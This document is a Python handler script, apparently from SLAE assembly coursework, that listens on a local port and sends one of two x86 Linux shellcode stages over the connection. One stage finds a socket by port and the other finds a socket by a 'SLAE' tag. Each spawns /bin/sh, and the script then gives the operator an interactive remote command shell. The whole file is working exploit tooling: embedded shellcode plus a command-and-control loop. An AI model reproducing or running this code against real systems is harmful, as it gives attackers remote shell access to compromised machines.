#!/usr/bin/python3

import socket
import time
import argparse

find_port = b"\x31\xdb\x53\x89\xe7\x6a\x10\x54\x57\x53\x89\xe1\xb3\x07\xff\x01\x6a\x66\x58\xcd\x80\x66\x81\x7f\x02\x05\x39\x75\xf1\x5b\x6a\x02\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"

find_tag = b"\x31\xdb\x53\x89\xe6\x6a\x40\xb7\x0a\x53\x56\x53\x89\xe1\x86\xfb\x66\xff\x01\x6a\x66\x58\xcd\x80\x81\x3e\x53\x4c\x41\x45\x75\xf0\x5f\x89\xfb\x6a\x02\x59\x6a\x3f\x58\xcd\x80\x49\x79\xf8\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xcd\x80"
tag = b"SLAE"

parser = argparse.ArgumentParser()
parser.add_argument("type", choices=["port","tag"], help="Find specific port or tag")
args = parser.parse_args()

if args.type == "port": 
    payload = find_port
else :
    payload = find_tag


sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#sock.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)

ip = "127.0.0.1"
port = 1337
sock.bind((ip, port))

sock.listen(1)
print("[x] Started reverse handler on {}:{}".format(ip, port))

conn, address = sock.accept()
print("[x] Connection established from {}".format(address[0]))

print("[x] Sending second stage ({} bytes) to {}".format(len(payload),address[0]))
conn.send(payload)
time.sleep(1)

if args.type == "tag":
    print("[x] Sending tag '{}'".format(tag.decode()))
    conn.send(tag)

while True:
    cmd = input("# ")
    conn.send(cmd.encode() + b"\n")

    if cmd == "exit":
        conn.close()
        sock.close()
        break

    rep = conn.recv(1024);
    print(rep.decode(), end="")
